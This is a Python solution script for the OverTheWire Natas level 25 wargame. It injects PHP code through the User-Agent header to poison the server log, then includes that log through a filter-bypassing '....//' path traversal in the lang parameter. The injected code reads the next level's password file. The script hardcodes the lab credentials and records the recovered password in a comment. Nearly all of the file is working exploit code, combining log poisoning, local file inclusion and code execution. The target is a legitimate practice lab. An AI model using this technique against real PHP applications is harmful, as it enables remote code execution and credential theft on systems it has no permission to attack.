import requests

url = 'http://natas25.natas.labs.overthewire.org/'
username = 'natas25'
password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'
headers = {'User-Agent': "<?php echo exec('cat /etc/natas_webpass/natas26') ?>"}
session = requests.session()
response = session.get(url, headers=headers,  auth=(username, password))
print(response.request.headers)
sessid = session.cookies['PHPSESSID']
response = session.get(url, headers=headers, params={"lang": "....//....//....//....//....//var/www/natas/natas25/logs/natas25_" + sessid + ".log"} ,auth=(username, password))
print(response.text)

# natas26_pass: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T

# params={"lang": "....//....//....//....//....//var/www/natas/natas25/logs/natas25_" . session.cookies['PHPSESSID'] . ".log"},